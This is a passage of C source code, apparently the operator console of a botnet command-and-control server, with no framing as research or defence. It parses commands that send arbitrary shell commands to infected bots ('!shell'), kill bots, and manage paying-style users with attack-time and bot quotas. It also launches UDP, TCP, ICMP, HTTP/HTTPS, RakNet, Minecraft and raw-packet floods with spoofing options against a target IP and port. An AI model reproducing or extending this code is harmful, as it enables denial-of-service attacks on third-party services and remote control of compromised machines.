        snprintf(resp, RESP_SZ, RED "Usage: !shell <ip|all> <cmd>\r\n" RESET);
        return;
    }
    memcpy(target, args, tl);
    target[tl] = '\0';
    const char *cmd = sp + 1;
    while (*cmd == ' ') cmd++;
    if (!*cmd || strlen(cmd) > 1500) {
        snprintf(resp, RESP_SZ, RED "Usage: !shell <ip|all> <cmd>\r\n" RESET);
        return;
    }
    char line[2048];
    snprintf(line, sizeof(line), "shell|%s\n", cmd);
    int all = (strcmp(target, "all") == 0);
    int n = 0;
    static int fds[MAX_BOTS];
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (!bots[i].valid || bots[i].sock <= 0) continue;
        if (!all && !bot_ip_match(i, target)) continue;
        fds[n++] = bots[i].sock;
        if (n >= MAX_BOTS) break;
    }
    pthread_mutex_unlock(&bot_mutex);
    int hit = 0;
    for (int i = 0; i < n; i++) {
        if (send_cmd(fds[i], line) == 0) hit++;
    }
    if (n == 0) snprintf(resp, RESP_SZ, RED "No matching bots\r\n" RESET);
    else themed_snprintf(resp, RESP_SZ, "{LIME}Sent shell to %d/%d bots\r\n{RESET}", hit, n);
}

static void cmd_kill(User *u, const char *args, char *resp) {
    if (!u->is_admin) {
        snprintf(resp, RESP_SZ, RED "Admin only\r\n" RESET);
        return;
    }
    char target[64] = {0};
    if (args && *args) sscanf(args, "%63s", target);
    int all = (target[0] == '\0' || strcmp(target, "all") == 0);
    int n = 0;
    static int fds[MAX_BOTS];
    static int idxs[MAX_BOTS];
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count && n < MAX_BOTS; i++) {
        if (!bots[i].valid || bots[i].sock <= 0) continue;
        if (!all && !bot_ip_match(i, target)) continue;
        fds[n] = bots[i].sock;
        idxs[n] = i;
        n++;
    }
    pthread_mutex_unlock(&bot_mutex);
    int hit = 0;
    for (int i = 0; i < n; i++) {
        if (send_cmd(fds[i], "kill\n") == 0) hit++;
    }
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < n; i++) {
        int k = idxs[i];
        if (k < bot_count && bots[k].sock == fds[i]) {
            bots[k].busy = 0;
            bots[k].slot_id = -1;
        }
    }
    pthread_mutex_unlock(&bot_mutex);
    if (n == 0) snprintf(resp, RESP_SZ, RED "No matching bots\r\n" RESET);
    else themed_snprintf(resp, RESP_SZ, "{LIME}Killed %d/%d bots\r\n{RESET}", hit, n);
}

void handle_command(User *u, const char *cmd, int sock, const char *ip) {
    static char resp[RESP_SZ];
    char copy[MAX_CMD];
    strncpy(copy, cmd, sizeof(copy) - 1);
    copy[sizeof(copy) - 1] = '\0';
    size_t l = strlen(copy);
    while (l > 0 && isspace((unsigned char)copy[l - 1])) copy[--l] = '\0';

    log_user(u->user, ip, copy);

    char *sp = strchr(copy, ' ');
    char *args = "";
    if (sp) { *sp = '\0'; args = sp + 1; while (*args == ' ') args++; }

    if (strcmp(copy, "!help") == 0 || strcmp(copy, "!misc") == 0 ||
        strcmp(copy, "!attack") == 0 || strcmp(copy, "!admin") == 0 ||
        strcmp(copy, "!admincommands") == 0 || strcmp(copy, "!options") == 0 ||
        strcmp(copy, "!tools") == 0) {
        if ((strcmp(copy, "!admin") == 0 || strcmp(copy, "!admincommands") == 0 ||
             strcmp(copy, "!tools") == 0) && !u->is_admin) {
            send_line(sock, RED "Admin only\r\n" RESET);
            return;
        }
        char *pfx = handle_prefix_command(u, copy);
        if (pfx) {
            send_line(sock, pfx);
            free_theme_string(pfx);
        } else {
            send_line(sock, RED "Theme page missing\r\n" RESET);
        }
        return;
    }
    if (strcmp(copy, "!clear") == 0) {
        send_line(sock, "\033[H\033[J");
        return;
    }
    if (strcmp(copy, "!exit") == 0) {
        send_themed(sock, "{LIME}Bye\r\n{RESET}");
        close(sock);
        return;
    }
    if (strcmp(copy, "!attacks") == 0) { cmd_attacks(u, resp); send_line(sock, resp); return; }
    if (strcmp(copy, "!ongoing") == 0) { cmd_ongoing(u, resp); send_line(sock, resp); return; }
    if (strncmp(copy, "!bots", 5) == 0 && (copy[5] == '\0' || copy[5] == ' ')) {
        cmd_bots(u, args, resp);
        send_line(sock, resp);
        return;
    }
    if (strcmp(copy, "!stopall") == 0) { cmd_stopall(u, resp); send_line(sock, resp); return; }
    if (strcmp(copy, "!users") == 0) { cmd_users(u, resp); send_line(sock, resp); return; }
    if (strcmp(copy, "!user") == 0) {
        char name[50] = {0};
        sscanf(args, "%49s", name);
        cmd_user(u, name[0] ? name : NULL, resp);
        send_line(sock, resp);
        return;
    }
    if (strcmp(copy, "!stop") == 0) {
        int id = 0;
        if (sscanf(args, "%d", &id) != 1) {
            send_line(sock, RED "Usage: !stop <id>\r\n" RESET);
            return;
        }
        cmd_stop(u, id, resp);
        send_line(sock, resp);
        return;
    }
    if (strncmp(copy, "!shell", 6) == 0 && (copy[6] == '\0' || copy[6] == ' ')) {
        cmd_shell(u, args, resp);
        send_line(sock, resp);
        return;
    }
    if (strncmp(copy, "!kill", 5) == 0 && (copy[5] == '\0' || copy[5] == ' ')) {
        cmd_kill(u, args, resp);
        send_line(sock, resp);
        return;
    }
    if (strncmp(copy, "!groups", 7) == 0 && (copy[7] == '\0' || copy[7] == ' ')) {
        cmd_groups(u, args, resp);
        send_line(sock, resp);
        return;
    }
    if (strcmp(copy, "!archs") == 0) {
        cmd_archs(u, resp);
        send_line(sock, resp);
        return;
    }
    if (strcmp(copy, "!kickuser") == 0) {
        char name[50] = {0};
        if (sscanf(args, "%49s", name) != 1) {
            send_line(sock, RED "Usage: !kickuser <user>\r\n" RESET);
            return;
        }
        cmd_kick(u, name, resp);
        send_line(sock, resp);
        return;
    }
    if (strcmp(copy, "!adduser") == 0) {
        if (!u->is_admin) { send_line(sock, RED "Admin only\r\n" RESET); return; }
        char nu[50] = {0}, np[50] = {0};
        int mt = 0, mb = 0, adm = 0, md = 0;
        if (sscanf(args, "%49s %49s %d %d %d %d", nu, np, &mt, &mb, &adm, &md) != 6 ||
            strlen(nu) < 3 || strlen(np) < 4 || mt <= 0 || mb <= 0 || md < 0 || (adm != 0 && adm != 1)) {
            send_line(sock, RED "Usage: !adduser <user> <pass> <maxtime> <maxbots> <admin 0|1> <maxdaily>\r\n" RESET);
            return;
        }
        int r = users_add(nu, np, mt, mb, adm, md);
        if (r == -1) send_line(sock, RED "User exists\r\n" RESET);
        else if (r != 0) send_line(sock, RED "Failed to add user\r\n" RESET);
        else {
            themed_snprintf(resp, sizeof(resp), "{LIME}Added %s\r\n{RESET}", nu);
            send_line(sock, resp);
        }
        return;
    }
    if (strcmp(copy, "!removeuser") == 0) {
        if (!u->is_admin) { send_line(sock, RED "Admin only\r\n" RESET); return; }
        char name[50] = {0};
        if (sscanf(args, "%49s", name) != 1) {
            send_line(sock, RED "Usage: !removeuser <user>\r\n" RESET);
            return;
        }
        if (users_remove(name) == 0) {
            themed_snprintf(resp, sizeof(resp), "{LIME}Removed %s\r\n{RESET}", name);
            send_line(sock, resp);
        } else {
            send_line(sock, RED "User not found\r\n" RESET);
        }
        return;
    }
    if (strcmp(copy, "!udp") == 0 || strcmp(copy, "!tcp") == 0 ||
        strcmp(copy, "!icmp") == 0 || strcmp(copy, "!https") == 0 ||
        strcmp(copy, "!http") == 0 || strcmp(copy, "!https-classic") == 0 ||
        strcmp(copy, "!raknet") == 0 || strcmp(copy, "!minecraft") == 0 ||
        strcmp(copy, "!tcpraw") == 0 || strcmp(copy, "!udpraw") == 0) {
        const char *method = copy + 1;
        char ipb[64] = {0}, pb[16] = {0}, tb[16] = {0};
        /* split args: ip [port] time [extra...] */
        char acopy[MAX_CMD];
        strncpy(acopy, args, sizeof(acopy) - 1);
        acopy[sizeof(acopy) - 1] = '\0';
        char *save = NULL;
        char *t1 = strtok_r(acopy, " \t", &save);
        char *t2 = strtok_r(NULL, " \t", &save);
        char *t3 = strtok_r(NULL, " \t", &save);
        const char *extra = save ? save : "";
        while (extra && *extra == ' ') extra++;
        if (strcmp(method, "icmp") == 0) {
            if (!t1 || !t2 || !valid_ip(t1)) {
                send_line(sock, RED "Usage: !icmp <ip> <time> [msg=..] [psize=..]\r\n" RESET);
                return;
            }
            strncpy(ipb, t1, 63);
            strncpy(tb, t2, 15);
            /* extra = everything after "<ip> <time>" */
            const char *p = args;
            p = strchr(p, ' ');
            if (p) { p++; while (*p == ' ') p++; p = strchr(p, ' '); }
            extra = (p && *p) ? p + 1 : "";
            while (*extra == ' ') extra++;
        } else {
            int is_host = (strcmp(method, "https") == 0 || strcmp(method, "https-classic") == 0);
            if (!t1 || !t2 || !t3) {
                if (strcmp(method, "https") == 0)
                    send_line(sock, RED "Usage: !https <host> <port> <time> [path=..]\r\n" RESET);
                else if (strcmp(method, "https-classic") == 0)
                    send_line(sock, RED "Usage: !https-classic <host> <port> <time> [path=..]\r\n" RESET);
                else if (strcmp(method, "http") == 0)
                    send_line(sock, RED "Usage: !http <ip> <port> <time> [path=..]\r\n" RESET);
                else if (strcmp(method, "raknet") == 0)
                    send_line(sock, RED "Usage: !raknet <ip> <port> <time>\r\n" RESET);
                else if (strcmp(method, "minecraft") == 0)
                    send_line(sock, RED "Usage: !minecraft <ip> <port> <time>\r\n" RESET);
                else if (strcmp(method, "tcpraw") == 0)
                    send_line(sock, RED "Usage: !tcpraw <ip> <port> <time> [tcpflags=..] [srcport=..] [spoof=..] [psize=..] [msg=..]\r\n" RESET);
                else if (strcmp(method, "udpraw") == 0)
                    send_line(sock, RED "Usage: !udpraw <ip> <port> <time> [srcport=..] [spoof=..] [psize=..] [msg=..]\r\n" RESET);
                else {
                    char ugh[128];
                    snprintf(ugh, sizeof(ugh), RED "Usage: !%.16s <ip> <port> <time> [msg=..] [psize=..]\r\n" RESET, method);
                    send_line(sock, ugh);
                }
                return;
            }
                if (!is_host && !valid_ip(t1)) {
                    char ugh[128];
                    snprintf(ugh, sizeof(ugh), RED "Usage: !%.16s <ip> <port> <time> [msg=..] [psize=..]\r\n" RESET, method);
                    send_line(sock, ugh);
                    return;
                }
            strncpy(ipb, t1, 63);
            strncpy(pb, t2, 15);
            strncpy(tb, t3, 15);
            const char *p = args;
            for (int k = 0; k < 3 && p; k++) {
                p = strchr(p, ' ');
                if (p) { p++; while (*p == ' ') p++; }
            }
            extra = (p && *p) ? p : "";
        }
        int port = atoi(pb);
        int dur = atoi(tb);
        cmd_attack(u, method, ipb, port, dur, extra, resp);
        send_line(sock, resp);
        return;
    }
    send_line(sock, RED "Unknown command. Try !help\r\n" RESET);
}
